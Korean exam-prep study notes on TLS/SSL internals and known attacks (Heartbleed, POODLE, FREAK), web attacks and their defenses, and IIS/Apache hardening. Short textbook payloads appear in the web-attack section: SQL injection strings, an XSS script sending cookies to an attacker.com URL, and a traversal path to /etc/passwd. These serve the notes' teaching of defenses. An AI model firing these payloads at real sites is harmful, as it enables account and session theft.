## 1. 웹 보안 위협 개요

TCP/IP와 HTTP는 **기본적으로 보안 서비스를 제공하지 않는다.**  
이 때문에 평문 전송 시 도청, 위변조, 신원 위조 등의 위협에 노출된다.

---

## 2. 웹 트래픽 보안 방법

### ⭐ 핵심 — 보안 기능이 TCP/IP 스택 어디에 위치하는가

```
[응용 계층]     HTTP / SMTP / POP3
                      │
                  ← TLS가 여기 위치 (TCP 위, 응용 아래)
                      │
[전송 계층]           TCP
                      │
                  ← IPSec이 여기 위치 (IP 계층)
                      │
[네트워크 계층]       IP
                      │
[링크 계층]       Ethernet 등
```

| 방법 | 계층 위치 | 특징 |
|------|-----------|------|
| **IPSec** | IP 계층 | 모든 응용에 투명하게 적용, 선택적 암호화(protect or bypass) |
| **SSL/TLS** | TCP 위 (전송~응용 사이) | 특정 응용(HTTP, SMTP, POP3)별로 선택적 적용 가능 |

---

## 3. IPSec vs SSL/TLS 비교

| 구분 | IPSec | SSL/TLS |
|------|-------|---------|
| 동작 계층 | IP 계층 | TCP 위 (전송~응용 사이) |
| 보호 단위 | 패킷 단위 | 메시지 단위 |
| 응용 투명성 | 종단 사용자 응용에 투명 | 응용별로 적용 |
| 선택적 암호화 | 어렵다 | 쉽다 |
| 비유 | 네트워크 전체를 감싸는 느낌 | 특정 통신만 골라서 감싸는 느낌 |

## 4. SSL/TLS 개요

### 기본 개념 ⭐

- **SSL/TLS**: 클라이언트/서버 환경에서 **TCP 기반 Application에 대한 종단간(End-to-End) 보안 서비스**를 제공하는 전송 계층 보안 프로토콜
- 특정 암호 기술에 의존하지 않고, **암호 스위트(부품식 운영)** 방식으로 다양한 알고리즘 조합 가능
- 사용하는 암호 기술 조합:

```
대칭키 암호     → 데이터 암호화 (기밀성)
공개키 암호     → 인증, 키 교환
일방향 해시함수 → 무결성 계산
MAC            → 메시지 인증
전자서명        → 신원 확인, 인증서 검증
의사난수 생성기  → 키 재료 생성
```

### SSL → TLS 역사

| 버전 | 상태 | 비고 |
|------|------|------|
| SSL 1.0 | 사용 X | 에러 多, 내부용 |
| SSL 2.0 | 사용 X | MITM 취약 |
| SSL 3.0 | 사용 X | POODLE 취약점 발견 (2014) |
| TLS 1.0 | 구버전 | SSL 3.1에 해당, RFC 2246 |
| TLS 1.1 | 구버전 | AES 추가 |
| TLS 1.2 | 사용 | GCM/CCM, HMAC-SHA256, SHA-256 PRF 추가 / IDEA·DES 제거 |
| TLS 1.3 | 현재 표준 | RFC 8446, 0-RTT 추가, ECDSA 기본 추가, MD5·SHA-1·RC4·3DES 제거 |

> **TLS 1.0 = SSL 3.1?** → SSL 3.0을 기반으로 IETF가 표준화하면서 이름을 TLS 1.0으로 바꾼 것. "SSL의 다음 세대가 TLS"라고 이해하면 된다.

## 5. SSL/TLS 보안 서비스

> **⭐ 무조건 암기**

| 보안 서비스 | 사용 기술 | 설명 |
|------------|-----------|------|
| **기밀성** | DES, RC4 등 대칭키 암호 | Handshake로 생성된 비밀키로 데이터 암호화 |
| **상호 인증** | RSA(비대칭키), DSS(전자서명), X.509 인증서 | 클라이언트↔서버 상호 신원 확인 |
| **무결성** | MAC (안전한 해시 알고리즘) | 메시지가 중간에 변조되지 않았는지 확인 |

> ❌ **부인방지는 제공하지 않는다!**

## 6. 암호 스위트(Cipher Suite)

### 개념

TLS 통신 시 사용할 **암호 알고리즘 묶음(세트)**을 말한다.  
클라이언트와 서버가 동일한 암호 스위트를 사용해야 통신 가능 → 상호운용성 확보 필요

### 형식

```
SSL/TLS_(키교환/인증 알고리즘)_WITH_(대칭암호 알고리즘)
```

### 예시 분석 ⭐

```
TLS_RSA_WITH_AES_256_CBC_SHA256
 │    │         │    │   │   │
 │    │         │    │   │   └─ MAC용 해시: SHA-256
 │    │         │    │   └───── 블록암호 모드: CBC
 │    │         │    └───────── 키 길이: 256bit
 │    │         └────────────── 대칭암호: AES
 │    └──────────────────────── 키교환/인증: RSA
 └───────────────────────────── 프로토콜: TLS
```

## 7. TLS 프로토콜 구조

### TLS 스택 ⭐

```
[HTTP / SMTP / POP3]
         ↓
      [TLS]
┌────────────────────┐
│ Handshake Protocol │ ← 인증, 키 협상
│ ChangeCipherSpec   │ ← 새 암호 설정 전환 신호
│ Alert Protocol     │ ← 에러/경고 전달
│ Heartbeat Protocol │ ← 연결 생존 확인
├────────────────────┤
│ Record Protocol    │ ← 데이터 포장, 암호화, 무결성 처리
└────────────────────┘
         ↓
       [TCP]
         ↓
        [IP]
```

### 각 프로토콜 역할 요약

| 프로토콜 | 역할 |
|----------|------|
| **Record** | 데이터 운반자. 단편화→압축→MAC→암호화→헤더추가→TCP 전송 |
| **Handshake** | 버전 협상, 암호 스위트 합의, 인증, 키 생성 |
| **ChangeCipherSpec** | "이제부터 새 키/알고리즘 사용" 신호 |
| **Alert** | 경고(warning) 또는 치명(fatal) 오류 통보 |
| **Heartbeat** | 연결 생존 확인 (주기적 신호) |

> **TLS vs DTLS**: TLS는 TCP 기반, DTLS는 UDP 기반

## 8. Handshake 프로토콜

### 개요

SSL/TLS에서 가장 복잡하고 핵심적인 부분.  
서버와 클라이언트가 **서로 인증하고, 암호 방식 합의하고, 키를 생성**하는 과정.

### 키 생성 흐름 ⭐

```
pre_master_secret (클라이언트가 생성한 48바이트 임시 비밀값)
        +
client_random (클라이언트 난수)
        +
server_random (서버 난수)
        ↓
   master_secret
        ↓
    key block
        ↓
실제 암호키 6개 생성
(클라이언트→서버 암호키, 서버→클라이언트 암호키, MAC 키, IV 등)
```

> **왜 random을 섞냐?** → 매 연결마다 예측 불가능한 키를 만들어 재전송 공격 방지

### Full Handshake 전체 흐름 ⭐

```
클라이언트                                          서버
   │                                                 │
   ├─────────────── ClientHello ───────────────────>│
   │                                                 │
   │<──────────────── ServerHello ───────────────────┤
   │<──────────────── Certificate ───────────────────┤
   │<──────────────── ServerKeyExchange ─────────────┤ (필요 시만)
   │<──────────────── CertificateRequest ────────────┤ (선택)
   │<──────────────── ServerHelloDone ───────────────┤
   │                                                 │
   ├─────────────── Certificate ───────────────────>│ (요청받은 경우)
   ├─────────────── ClientKeyExchange ─────────────>│
   ├─────────────── CertificateVerify ─────────────>│ (선택)
   ├─────────────── ChangeCipherSpec ──────────────>│
   ├─────────────── Finished ──────────────────────>│
   │                                                 │
   │<─────────────── ChangeCipherSpec ───────────────┤
   │<─────────────── Finished ───────────────────────┤
   │                                                 │
   └──────────────── 안전한 통신 시작 ───────────────┘
```

### 각 메시지 설명 ⭐

| 메시지 | 방향 | 내용 |
|--------|------|------|
| **ClientHello** | C→S | TLS 버전, client_random, session_id, cipher_suites 목록, 압축방법 |
| **ServerHello** | S→C | 사용할 버전, server_random, session_id, 선택한 cipher suite |
| **Certificate** | S→C | 서버 인증서 (서버 공개키 + CA 서명 포함). 브라우저 내장 CA 공개키로 검증 |
| **ServerKeyExchange** | S→C | 인증서만으로 키교환 정보 부족할 때 추가 전송 (선택) |
| **CertificateRequest** | S→C | 클라이언트 인증서 요청 (선택, 있으면 상호인증) |
| **ServerHelloDone** | S→C | 서버 초기 협상 완료 신호 |
| **Certificate** | C→S | 서버 요청 시 클라이언트 인증서 전송 |
| **ClientKeyExchange** | C→S | **pre_master_secret 생성 후 서버 공개키로 암호화하여 전송** |
| **CertificateVerify** | C→S | 클라이언트 개인키로 서명 → 서버가 클라이언트 공개키로 검증 |
| **ChangeCipherSpec** | 양방향 | "이제부터 협상된 새 키/알고리즘 사용" 전환 신호 |
| **Finished** | 양방향 | 핸드셰이크 정상 완료 확인 메시지 |

### 4단계 요약

| 단계 | 내용 |
|------|------|
| 1단계 (초기 협상) | 버전, CipherSuite, 압축방법, 난수 교환 |
| 2단계 (서버 인증) | 서버 인증서/키 전송, HelloDone (필수) |
| 3단계 (클라이언트 인증) | 클라이언트 인증서, KeyExchange (선택) |
| 4단계 (종료) | ChangeCipherSpec, Finished |

### 단축 협상 (Abbreviated Handshake, 6단계)

이미 세션이 있을 때 재사용하는 빠른 방식.

```
[클라이언트] → [서버]  : 1. ClientHello
[서버] → [클라이언트] : 2. ServerHello
[서버] → [클라이언트] : 3. ChangeCipherSpec
[서버] → [클라이언트] : 4. Finished
[클라이언트] → [서버]  : 5. ChangeCipherSpec
[클라이언트] → [서버]  : 6. Finished
```

> **session_id**: 처음 연결(Full)이면 empty, 재사용(Abbreviated)이면 기존 session_id 전송

### session vs connection 차이

| 구분 | 설명 |
|------|------|
| **Session** | 보안 상태 묶음 (master_secret, 알고리즘 등 저장). 재사용 가능 |
| **Connection** | 실제 한 번 맺어진 통신 연결 |

> 비유: Session = 보안 설정 파일 / Connection = 그 설정으로 실제 통신하는 선  
> 하나의 Session 기반으로 여러 Connection이 생길 수 있다.

## 9. Record 프로토콜

### 역할

실제 **데이터(HTTP 내용 등)를 보호해서 전송**하는 운반자.

제공 서비스:
- **기밀성**: Handshake에서 생성된 대칭키로 암호화
- **무결성**: MAC(메시지 인증 코드)으로 변조 여부 확인

### 처리 과정 ⭐

```
응용 데이터 (HTTP 등)
        ↓
[1] 단편화 (Fragment)
    → 큰 데이터를 적당한 크기로 자름
        ↓
[2] 압축 (선택)
        ↓
[3] MAC 추가
    → 무결성 검사용 (시퀀스 번호 포함 → 재전송 공격 방지)
        ↓
[4] 암호화
    → 대칭키 (AES 등)
        ↓
[5] TLS 헤더 추가
        ↓
TCP로 전송
```

### 재전송 공격(Replay Attack) 방지

MAC 계산 시 **시퀀스 번호(Sequence Number)** 를 포함시킨다.  
→ 이전 패킷을 그대로 다시 보내도 시퀀스 번호가 달라 MAC 검증 실패.

## 10. ChangeCipherSpec / Alert / Heartbeat 프로토콜

### ChangeCipherSpec

- **의미**: "이제부터 협상된 새 암호 설정을 적용한다"는 전환 신호
- Handshake 프로토콜 메시지 자체는 아님 (별도 프로토콜)

```
Handshake 완료
      ↓
ChangeCipherSpec 전송
      ↓
새 암호키/알고리즘 적용 시작
      ↓
Finished 전송
      ↓
안전한 TLS 통신 시작
```

### Alert 프로토콜

- TLS 통신 중 **오류/경고 전달**용
- 메시지 구조: **2바이트** (1바이트: 심각도 / 1바이트: 에러 코드)

| 심각도 | 의미 |
|--------|------|
| **warning** | 경고 수준 |
| **fatal** | 심각한 오류 → 연결 즉시 종료 |

### Heartbeat 프로토콜

- **연결이 살아있는지 확인**하는 주기적 신호
- "살아있어?" → "응, 살아있음" 형태로 동작
- 프로토콜 개체의 **가용성 모니터링** 및 **동기화** 용도

## 11. SSL/TLS 주요 공격

### HeartBleed (2014년 4월)

**원인**: OpenSSL의 Heartbeat 확장 모듈에서 **클라이언트 요청의 데이터 길이 검증을 하지 않음**

```
[정상 요청]
클라이언트: "HELLO" (길이=5)
서버: 5바이트만 돌려줌 → 정상

[공격]
클라이언트: 데이터="HELLO", 길이=50000 (거짓말)
서버: 길이 검증 안 함 → HELLO + 서버 메모리 데이터 64KB 유출
```

**유출 가능 정보**: SSL 서버 개인키, 세션키, 쿠키, ID/PW, 이메일 등  
**특성**: 버퍼 오버플로우 공격과 유사

**대응**:
1. OpenSSL 패치
2. 서버 인증서 재발급 (개인키 유출 가능성)
3. 사용자 비밀번호 재설정 유도

---

### POODLE 공격 (2014년 10월)

**핵심**: 공격자가 TLS를 **SSL 3.0으로 강제 다운그레이드**시켜 취약점 악용

```
원래: TLS 1.2 사용 예정
          ↓
공격자 개입: "SSL 3.0으로 낮춰!"
          ↓
취약한 SSL 3.0으로 통신 → 보안 정보 탈취
```

**대응**: SSL 3.0 사용 완전 비활성화

---

### FREAK 공격 (2015년 2월)

**핵심**: MITM을 통해 **512비트 RSA(Export 등급의 약한 암호)로 다운그레이드** 강제

> 배경: 과거 미국은 강한 암호의 수출을 금지했고, 약한 "Export Cipher Suite"가 존재했음.  
> 공격자는 이 약한 암호 스위트를 강제 사용하게 만들어 정보 탈취.

## 12. 완전 순방향 비밀성(PFS)

### 문제 상황

서버 개인키가 유출되면, 공격자가 **이전에 저장해둔 트래픽까지 모두 복호화** 가능.  
인증서 폐기(CRL/OCSP)를 해도 과거 트래픽은 복호화될 수 있다.

### PFS 개념

> 서버 개인키가 유출되어도 **과거 세션의 기밀성은 그대로 유지**되는 암호학적 성질

**원리**: 세션키를 서버 개인키로부터 직접 만들지 않고,  
**DH/ECDHE 같은 일회성 키 교환**으로 매 연결마다 새로 생성.

```
[PFS 미적용]
서버 개인키 유출 → 과거 세션키도 복원 가능 → 과거 트래픽 복호화

[PFS 적용 (DH)]
서버 개인키 유출 → 과거 세션키는 수학적으로 관련 없음 → 과거 트래픽 안전
```

---

## 13. HTTPS vs S-HTTP

### HTTPS ⭐

- HTTP over SSL/TLS
- 포트: **443**번
- URL: `https://`
- 현재 모든 브라우저 내장

**HTTPS가 암호화하는 요소** ⭐:
- 요청 문서 URL
- 문서 내용
- 브라우저 양식 입력값
- 쿠키 (Secure 옵션 / HttpOnly 옵션)
- HTTP 헤더

> **Secure 쿠키**: HTTPS에서만 전송  
> **HttpOnly 쿠키**: JS 접근 차단 → XSS 방어

### S-HTTP

- 기존 HTTP에 보안 기능을 추가한 확장 프로토콜
- URL: `shttp://`
- 포트: **80**번
- 현재 거의 사용하지 않음

### HTTPS vs S-HTTP 비교

| 구분 | HTTPS | S-HTTP |
|------|-------|--------|
| 방식 | **통신 채널(터널) 전체** 보호 | **HTTP 메시지 각각** 보호 |
| 기반 | SSL/TLS (터널링) | 메시지 자체 암호화/서명 |
| 포트 | 443 | 80 |
| 사용 현황 | 현재 표준 | 거의 미사용 |
| 클라이언트 수정 | 불필요 | 필요 |

---

## 14. 시험 핵심 암기 요약

### TLS 보안 서비스 3가지
- 기밀성 (대칭키 암호)
- 상호 인증 (공개키, 전자서명, X.509)
- 무결성 (MAC)
- ❌ 부인방지는 제공 안 함

### Handshake 흐름 핵심
```
ClientHello      → 내가 가능한 것들 제시
ServerHello      → 그중 하나 선택
Certificate      → 서버 신분증
ClientKeyExchange → pre_master_secret 공유
ChangeCipherSpec → 이제부터 암호화 시작
Finished         → 핸드셰이크 완료
```

### 키 생성 순서
```
pre_master_secret + client_random + server_random
        → master_secret → key block → 실제 암호키 6개
```

### 공격 3종 비교
| 공격 | 핵심 |
|------|------|
| HeartBleed | 길이 검증 실패 → 메모리 유출 (64KB) |
| POODLE | TLS → SSL 3.0 다운그레이드 |
| FREAK | TLS → 약한 RSA 512bit 다운그레이드 |

### 포트 정리
| 프로토콜 | 포트 |
|----------|------|
| HTTP | 80 |
| HTTPS | 443 |
| S-HTTP | 80 |

## 1. SQL Injection

### 개요

데이터베이스(DB)와 연동된 웹 애플리케이션에서 **입력값에 대한 유효성 검증을 하지 않아**,  
공격자가 SQL 문을 삽입해 DB 정보를 열람하거나 조작하는 공격.

```
[취약한 코드]
SELECT * FROM users WHERE id='입력값' AND pw='입력값';

[공격 입력]
id: ' OR 1=1 --

[결과 쿼리]
SELECT * FROM users WHERE id='' OR 1=1 --' AND pw='...';
→ 항상 참 → 인증 우회 성공
```

### 취약점 판단 방법

로그인/검색 필드에 `'`, `"`, `;` 등 특수문자를 입력해 **DB 에러 메시지 발생 여부** 확인.

---

### SQL Injection 공격 종류

#### ① Form SQL Injection

- WHERE 절 조건을 **항상 참**으로 만들어 인증 우회
- 대표 패턴: `' OR 1=1 --`

#### ② UNION SQL Injection

- `UNION SELECT`로 다른 테이블 결과를 합쳐 정보 탈취
- 조건: **각 SELECT의 컬럼 수가 같아야 하고, 타입이 호환**되어야 함

```sql
' UNION SELECT id, pw FROM admin --
```

#### ③ Error-Based SQL Injection ⭐

- DB가 반환하는 **에러 메시지를 힌트** 삼아 DB 구조를 단계적으로 파악
- "점진적"이란? → 한 번에 다 얻는 게 아니라 **조금씩 단계별로** 알아내는 것

```
1단계: 테이블 이름 추출
2단계: 컬럼 이름 추출
3단계: 실제 데이터 추출
(에러 메시지를 힌트 삼아 반복)
```

#### ④ Blind SQL Injection ⭐

- 에러 메시지가 **안 보일 때** 사용
- 쿼리의 **참/거짓 결과**만 보고 데이터를 추론하는 방식

```
조건이 참이면 → 페이지 정상 출력
조건이 거짓이면 → 페이지 다르게 출력

→ 이 차이를 반복 관찰해서 데이터 추출
```

---

### 대응 방법 ⭐

| 대응 | 설명 |
|------|------|
| **입력값 검증** | 모든 입력값에 대해 적절한 검증 수행 |
| **에러 메시지 숨김** | DB 에러 메시지 외부 노출 금지 |
| **최소권한 계정** | DB 계정에 최소 권한만 부여 |
| **동적 SQL 지양** | 입력값을 직접 SQL에 붙이는 방식 사용 금지 |
| **저장 프로시저 사용** | SQL 문 주입이 어려운 구조로 설계 |
| **Prepared Statement** | 가장 효과적인 방어 방법 |

### Prepared Statement (선처리 질의문) ⭐

**핵심 원리**: SQL 구조와 입력값을 **완전히 분리**

```
[위험한 방식]
"SELECT * FROM users WHERE id='" + input + "'"
→ 입력값이 SQL 구조에 섞임 → Injection 가능

[Prepared Statement]
"SELECT * FROM users WHERE id=?"
→ ?에 입력값은 그냥 "데이터"로 처리됨
→ SQL 명령어로 절대 해석 안 함 → Injection 불가
```

장점:
- SQL Injection 방어
- 반복 실행 성능 향상 (쿼리를 미리 컴파일)

## 2. XSS (Cross-Site Scripting)

### 개요

공격자가 넣은 **악성 스크립트가 피해자의 브라우저에서 실행**되는 공격.

- 서버가 아닌 **클라이언트(브라우저)를 공격**
- 사용자 실행 행위 없이 자동 실행 가능 → 매우 위험
- 피해: 쿠키 탈취, 악성코드 감염, 웹페이지 변조

---

### XSS 공격 종류

#### ① Stored XSS (저장형) — 가장 일반적

게시판 등에 악성 스크립트를 **DB에 저장**해두고, 피해자가 해당 글을 읽을 때 실행되는 방식.

```
[공격자]
<script>document.location='http://attacker.com?c='+document.cookie</script>
          ↓ (게시글 등록)
[서버 DB]
악성 스크립트 저장됨
          ↓
[피해자]
게시글 읽음 → 스크립트 포함 HTML 응답 → 브라우저에서 실행 → 쿠키 탈취
```

#### ② Reflected XSS (반사형)

악성 스크립트가 포함된 **URL을 클릭**하면, 서버가 그 내용을 그대로 응답에 포함시켜 실행되는 방식.

```
[공격자]
https://site.com?q=<script>악성코드</script>
→ 이 URL을 이메일로 피해자에게 전달
          ↓
[피해자 클릭]
서버: "검색어: <script>악성코드</script>"를 HTML에 그대로 포함
          ↓
브라우저에서 스크립트 실행
```

> "반사(Reflect)"의 의미: 입력한 스크립트가 요청 → 서버 → 응답으로 튕겨 나오는 것  
> 서버에 저장되지 않아 흔적이 남지 않는다는 장점(공격자 관점)이 있음

#### ③ DOM Based XSS

서버를 거치지 않고, **브라우저의 JS가 DOM을 조작하는 과정에서** 악성 스크립트가 실행되는 방식.

```
URL 해시값 (#...)
    ↓
브라우저 JS가 읽어서 DOM에 그대로 삽입
    ↓
스크립트 실행
```

> 세 가지 XSS 모두 **클라이언트(브라우저) 쪽에서 실행**된다는 공통점이 있다.

---

### XSS 대응 방법 ⭐

#### 특수문자 치환 (HTML 엔티티 인코딩)

```
< → &lt;
> → &gt;
& → &amp;
" → &quot;
```

치환 전: `<script>alert(1)</script>` → 실행됨  
치환 후: `&lt;script&gt;alert(1)&lt;/script&gt;` → 그냥 문자로 출력됨

#### 화이트리스트 방식 태그 허용

HTML 허용 게시판의 경우, 허용된 태그만(`<b>`, `<i>`, `<p>` 등) 허용하고 나머지는 제거.

#### 안전/취약 코드 비교 (Java 예시)

```java
// 취약한 코드
String name = request.getParameter("name");
// → name에 <script>가 포함되면 그대로 출력됨

// 안전한 코드
name = name.replaceAll("<", "&lt;");
name = name.replaceAll(">", "&gt;");
name = name.replaceAll("&", "&amp;");
name = name.replaceAll("\"", "&quot;");
```

## 3. CSRF (Cross-Site Request Forgery)

### 개요

공격자가 **로그인된 사용자의 권한**을 이용해, 사용자가 의도하지 않은 요청을 서버에 전송하는 공격.

- XSS: 악성 JS가 **브라우저에서 실행**  
- CSRF: 사용자가 의도하지 않은 요청을 **서버에 전송**

```
피해자 로그인 상태
      ↓
공격자가 링크/이미지 클릭 유도
      ↓
피해자 브라우저가 세션 쿠키를 자동으로 포함해 서버에 요청 전송
      ↓
서버: "정상적인 로그인 사용자의 요청이네" → 실행
      ↓
비밀번호 변경, 송금 등 피해 발생
```

### 왜 위험한가?

브라우저는 같은 사이트에 요청할 때 **세션 쿠키를 자동으로 포함**시킨다.  
→ 공격자가 만든 페이지에서 요청이 발생해도 서버는 정상 사용자 요청으로 인식.

### GET 방식이 CSRF에 취약한 이유

```
GET 방식: URL에 데이터가 그대로 노출됨
https://bank.com/transfer?to=attacker&amount=100000

→ 공격자가 URL 조작 후 피해자에게 전달하기 쉬움
→ 이미지 태그 등으로도 자동 요청 가능
```

### 대응 방법 ⭐

| 대응 | 설명 |
|------|------|
| **CSRF Token** | 서버가 세션별 랜덤 토큰 발급 → 요청마다 토큰 검사 (공격자는 토큰 모름) |
| **CAPTCHA** | 사람인지 확인 (자동 공격 차단) |
| **재인증 요구** | 중요한 행위(비밀번호 변경 등) 전 비밀번호 재입력 요구 |
| **POST 사용** | GET 방식보다 조작하기 어려움 |

---

## 4. SSRF (Server-Side Request Forgery)

### 개요

공격자가 조작된 요청을 웹서버에 전송하여, **웹서버가 내부 네트워크에 있는 다른 서버에 악의적인 요청을 보내도록** 유도하는 공격.

```
공격자
    ↓ (조작된 URL 전달)
웹 서버 (외부에서 접근 가능)
    ↓ (내부망 서버에 요청)
내부 서버 (원래 외부 접근 불가)
    ↓
내부 정보 반환 → 공격자에게 전달
```

### 왜 위험한가?

외부 공격자는 원래 내부망에 직접 접근할 수 없다.  
하지만 서버가 **대신 접근**해주는 구조이므로 접근통제를 우회할 수 있다.

### 대응 방법

내부 네트워크 서버 간이라도 **기기 인증, 서비스 접근 권한**을 확인하고 요청을 처리.

---

## 5. XSS vs CSRF vs SSRF 비교

| 구분 | XSS | CSRF | SSRF |
|------|-----|------|------|
| **공격 대상** | 클라이언트(브라우저) | 서버 (사용자 권한 이용) | 내부 서버 |
| **조작된 요청 발생 주체** | 브라우저 JS | 사용자(클라이언트) 브라우저 | 웹서버 |
| **핵심** | 악성 JS 브라우저 실행 | 사용자 권한으로 서버 요청 | 서버가 대신 내부망 요청 |
| **주요 피해** | 쿠키 탈취, 페이지 변조 | 의도치 않은 행위 수행 | 내부 정보 탈취 |

---

## 6. 디렉터리 탐색 (Directory Traversal)

### 개요

경로 조작 문자(`../`)를 필터링하지 않으면, 웹 서버의 **상위 디렉터리로 이동**해 시스템 파일에 접근 가능.

```
[공격 URL 예시]
http://www.example.com/board/download.jsp?filename=../../../../../../../etc/passwd

[의미]
../ → 상위 디렉터리 이동
→ 결국 /etc/passwd (시스템 계정 파일)에 접근
```

### 직접 객체 참조 (IDOR)

```
download?id=1   →   download?id=2 로 변경
→ 다른 사용자의 파일/정보에 접근 가능
```

---

## 7. 파일 업로드 취약점

### 개요 ⭐

공격자가 **웹셸(WebShell)** 파일을 서버에 업로드하고, 웹에서 실행시켜 서버를 장악하는 공격.

```
공격자
    ↓ (webshell.php 업로드)
게시판 첨부파일로 저장
    ↓
URL로 직접 접근하여 실행
    ↓
서버 장악 → 내부 침투
```

### 웹셸(WebShell)이란?

- **웹 + 셸**: 웹페이지 형태의 원격 명령 실행 도구
- 브라우저에서 서버에 시스템 명령을 실행시킬 수 있는 악성 스크립트

### 파일 필터링 방식 비교

| 방식 | 설명 | 특징 |
|------|------|------|
| **화이트리스트** | 허용된 확장자만 업로드 허용 (`.hwp`, `.doc`, `.pdf`, `.jpg` 등) | 더 안전, 권장 |
| **블랙리스트** | 알려진 위험 확장자만 차단 | 우회 가능성 있음 |

> 웹 애플리케이션에서는 **화이트리스트 방식을 권장**

### 대응 방법 ⭐

- 확장자 검증 (화이트리스트 방식)
- 업로드 폴더에 **실행 권한 부여 금지**
- 저장 파일명을 실제 파일명과 다르게 변경 (외부에서 식별 불가)
- 업로드 폴더 경로 외부 노출 금지
- 파일 다운로드 요청 시 파일명 검증
- 무결성 검사 (변조 여부 확인)

---

## 8. 리버스 셸 (Reverse Shell)

### 개요

웹 해킹으로 서버 권한 획득 후, **피해 서버가 공격자에게 역방향으로 연결**하는 방식.

```
[일반 연결]
공격자 → 피해 서버   (방화벽이 차단)

[리버스 셸]
피해 서버 → 공격자   (아웃바운드는 방화벽이 허용하는 경우 多)
```

### 왜 가능한가?

방화벽은 보통:
- **인바운드(외부→내부)**: 80번 등 허용 포트 외 차단
- **아웃바운드(내부→외부)**: 별다른 필터링 없는 경우 多

→ 리버스 셸은 이 허점을 이용.

### 대응

- 실행 파일(`.exe`) 업로드 제한
- 불필요한 아웃바운드 접속 방화벽 차단

---

## 9. 보안 설정 취약점

### 디렉터리 리스팅 (Directory Listing)

웹 서버의 특정 디렉터리에 접근 시 **파일 목록이 그대로 노출**되는 취약점.

### 백업/임시 파일 존재

개발 후 삭제하지 않은 백업 파일 노출 시:

```
index.jsp.bak
db.sql
```

→ 소스코드, DB 접속 정보 등 중요 정보 노출 가능.

### 주석 관리 미흡

HTML 주석은 웹 프록시(Burp, OWASP ZAP 등)를 통해 사용자도 볼 수 있다.  
→ 내부 로직, 계정 정보 등이 주석에 포함되면 위험.

### 하드코딩 패스워드

```java
String pw = "admin123"; // 코드에 직접 비밀번호 박아둠
```

→ 소스코드 유출 시 관리자 정보 노출.

---

## 10. 특수문자 필터링 및 서버 측 통제

### 필터링 대상 주요 특수문자

| 특수문자 | 관련 공격 |
|----------|-----------|
| `'` | XSS, SQL Injection |
| `--` | SQL Injection |
| `=` | SQL Injection |
| `;` | SQL Injection |
| `*` | SQL Injection |
| `/` | XSS, 디렉터리 탐색 |

### 왜 클라이언트 JS 필터링만으론 안 되는가

```
클라이언트 JS (JavaScript, VBScript 등)
→ 웹 프록시를 통해 전달되는 과정에서 변조/우회 가능

∴ 최종 검증은 반드시 서버 측 스크립트(JSP, ASP 등)로 수행
```

### 세션 관리

URL 접근 제한 실패를 막기 위해 **모든 웹 페이지에 세션 인증 수행**.

---

## 11. WAF (Web Application Firewall)

### 개요

SQL Injection, XSS 등 **웹 공격을 탐지하고 차단**하는 웹 전용 방화벽.

추가 기능: 정보 유출 방지, 부정 로그인 방지, 웹사이트 위변조 방지 등

### 기존 방화벽 vs WAF 비교

| 구분 | 기존 방화벽 | WAF |
|------|------------|-----|
| **목적** | 유해 포트 차단 | 유해 HTTP 요청 차단 |
| **동작 계층** | 네트워크 (3~4계층) | 애플리케이션 (7계층) |
| **필터링 기준** | IP, PORT | URL, HTTP 내용 |

---

## 12. 시험 핵심 암기 요약

### 공격 3종 핵심 비교

| 공격 | 실행 주체 | 피해 |
|------|-----------|------|
| XSS | 브라우저 (클라이언트) | 쿠키 탈취, JS 실행 |
| CSRF | 사용자 브라우저 (서버 요청) | 의도치 않은 서버 행위 |
| SSRF | 웹 서버 | 내부망 접근, 정보 탈취 |

### SQL Injection 대응 핵심
1. 입력값 검증
2. 에러 메시지 숨김
3. 최소권한 DB 계정
4. **Prepared Statement 사용** (가장 효과적)

### 파일 업로드 대응 핵심
1. 화이트리스트 확장자 검증
2. 업로드 폴더 실행권한 제거
3. 저장 파일명 변경

### XSS 대응 핵심
1. 특수문자 HTML 엔티티 치환 (`<` → `&lt;`)
2. 화이트리스트 태그 허용
3. HttpOnly 쿠키 설정 (JS 쿠키 접근 차단)

## 1. IIS 보안 설정

### 업로드 폴더 실행권한 제한

```
[위험한 상황]
업로드 폴더에 실행 권한 존재
    ↓
공격자가 webshell 업로드
    ↓
URL로 접근하여 실행
    ↓
서버 장악

[대응]
업로드 폴더의 실행 권한 제거 → webshell 업로드해도 실행 불가
```

### 관리자 페이지 접근통제

- 관리자 페이지를 **허용된 IP에서만 접근** 가능하도록 설정
- 외부에 그대로 노출 시 공격자가 무제한 접근 시도 가능

### HTTP 메소드 제한

불필요한 메소드 허용 시 위험:

| 메소드 | 위험 |
|--------|------|
| `DELETE` | 서버 파일/리소스 삭제 가능 |
| `PUT` | 임의 파일 업로드 가능 |

→ 운영 서버에서는 **GET, POST 외 메소드는 제거** 권장

### 헤더 정보 숨김

기본 설정 시 응답 헤더에 서버 정보가 포함됨:

```
[설정 전]
Server: Apache/2.4.1 (Ubuntu)
→ 공격자가 버전 확인 후 해당 버전 취약점 검색

[설정 후]
Server: Apache
또는 헤더 완전 제거
→ 정보 노출 최소화
```

> Apache의 `ServerTokens` 지시자와 동일한 개념

## 2. Apache 보안 설정

### 서버 실행 계정

```
[과거 - 위험]
root 권한으로 Apache 실행
→ 웹서버 취약점 침해 시 시스템 전체 장악 가능

[현재 - 안전]
nobody 또는 apache 계정(전용 제한 계정)으로 실행
→ 웹서버 침해되어도 시스템 전체까지 권한 확대 어려움
```

> `nobody` 계정은 로그인도 허용되지 않는 최소 권한 계정

### httpd.conf 주요 설정 항목

| 지시자 | 설명 |
|--------|------|
| `ServerType standalone` | 웹 요청을 Apache가 직접 처리 (성능 좋음, 웹에서 주로 사용) |
| `Timeout 300` | 300초 동안 통신 없으면 연결 해제 |
| `MaxKeepAliveRequests 100` | KeepAlive 상태에서 최대 요청 처리 건수 |
| `MaxClients 150` | 동시 접속자 수 최대값 (최대 256) |
| `ErrorLog` | 에러 로그 파일 경로 |
| `ServerTokens` | 서버 정보 표시 제한 수준 설정 |

### ServerTokens 옵션 비교

| 값 | 출력 내용 |
|----|-----------|
| `ProductOnly` | 웹서버 종류만 표시 (권장) |
| `Minimal` | 웹서버 종류 + 버전 |
| `OS` | 웹서버 종류 + 버전 + OS 정보 |
| `Full` | 웹서버 종류 + 버전 + OS + 설치 모듈 (위험) |

### standalone vs inetd 비교

| 방식 | 동작 방식 | 특징 |
|------|-----------|------|
| **standalone** | Apache가 직접 요청 수신/처리 | 성능 좋음, 웹에서 주로 사용 |
| **inetd** | inetd 데몬이 받아 Apache에 전달 | 요청 적을 때 사용 |

